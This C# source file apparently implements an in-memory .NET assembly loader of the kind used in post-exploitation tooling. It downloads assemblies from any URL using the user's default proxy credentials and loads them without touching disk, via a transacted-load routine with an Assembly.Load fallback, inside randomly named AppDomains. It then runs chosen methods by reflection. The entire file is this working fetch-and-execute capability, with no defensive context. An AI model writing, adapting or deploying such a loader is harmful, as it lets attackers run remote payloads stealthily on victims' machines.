using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Reflection;

namespace Domains
{
    public class Manager
    {
        private Dictionary<string, Loader> assemblies;
        private Dictionary<string, AppDomain> domains;

        public Manager()
        {
            assemblies = new Dictionary<string, Loader>();
            domains = new Dictionary<string, AppDomain>();
        }

        public void loadAssembly(string url, string method, string name)
        {
            Loader.CreateDomAndLoadAssembly(url, out Loader loader, out AppDomain dom, ref name);

            if (name == null)
            {
                Console.WriteLine("[X] Assembly not loaded!");
                return;
            }

            if (!assemblies.ContainsKey(name))
            {
                assemblies.Add(name, loader);
                domains.Add(name, dom);
            }
            else
            {
                Console.WriteLine("[!] Assembly already loaded and available!");
                AppDomain.Unload(dom);
            }
        }

        public void executeMethod(string assembly, string method, string args)
        {
            string[] parameters = { args };
            Loader.ExecuteMethod(assemblies[assembly], method, parameters);
        }
        public void unloadAssembly(string unloadAssembly)
        {
            assemblies.Remove(unloadAssembly);
            var dom = domains[unloadAssembly];
            AppDomain.Unload(dom);
            domains.Remove(unloadAssembly);
        }

        public void listLoadedAssemblies()
        {
            if (assemblies.Count > 0)
            {
                Console.WriteLine("[*] Loaded assemblies: ");

                foreach (var assembly in assemblies.Keys)
                {
                    Console.WriteLine("     - " + assembly.ToString());
                }
            }
            else
                Console.WriteLine("No assemblies available.");
        }

        public void listMethodsAvailable(string assembly)
        {
            Loader.ListMethods(assemblies[assembly]);
        }
    }

    public class Loader : MarshalByRefObject
    {
        public Assembly ass = null;

        private void LoadAssembly(string url, ref string aName)
        {
            IWebProxy wp = WebRequest.DefaultWebProxy;
            wp.Credentials = CredentialCache.DefaultCredentials;
            WebClient wc = new WebClient
            {
                Proxy = wp
            };

            byte[] buffer =  wc.DownloadData(url);
            try
            {
                ass = TransactedAssembly.Load(buffer, aName);
            }
            catch
            {
                Console.WriteLine("[X] Error parsing header structure. Falling to regular in memory assembly load.");
                ass = Assembly.Load(buffer);
                if (ass != null)
                    Console.WriteLine("[+] Assembly successfully loaded.");
            }

            if (ass != null)
            {
                if (ass.GetModules().Length == 1)
                    aName = ass.GetModules()[0].ScopeName;
                else
                    aName = ass.FullName;
            }
            else
            {
                aName = null;
            }
 
        }
        private void Execute(string method, string[] parameters)
        {

            Assembly assembly = ass;
            Type[] types = assembly.GetTypes();
            MethodInfo m = null;
            Type myType = null;
            foreach (var type in types)
            {

                m = type.GetMethod(method);
                if (m != null)
                {
                    myType = type;
                    break;
                }
            }

            if (m != null && myType != null)
            {
                var myInstance = Activator.CreateInstance(myType);
                m.Invoke(myInstance, new object[] { parameters });
            }
           
        }

        private void ListMethods()
        {
            Console.WriteLine("[*] Available methods in " + ass.GetModules()[0].ScopeName + ":");
            foreach(Type type in ass.GetTypes())
            {
                foreach(MethodInfo m in type.GetMethods())
                {
                    Console.WriteLine("  - " + type.Name + "\\" + m.Name);
                }
            }
        }

        public static string randomString()
        {
            Random random = new Random();
            int length = 10;
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }
        public static void CreateDomAndLoadAssembly(string url, out Loader loader, out AppDomain dom, ref string aName)
        {
            string name = randomString();
            dom = AppDomain.CreateDomain(name);
            loader = (Loader)dom.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(Loader).FullName);
            loader.LoadAssembly(url, ref aName);

        }

        public static void ExecuteMethod( Loader ld, string method, params string[] parameters)
        {
            ld.Execute(method, parameters);
        }

        public static void ListMethods(Loader ld)
        {
            
            ld.ListMethods();

        }

    }
}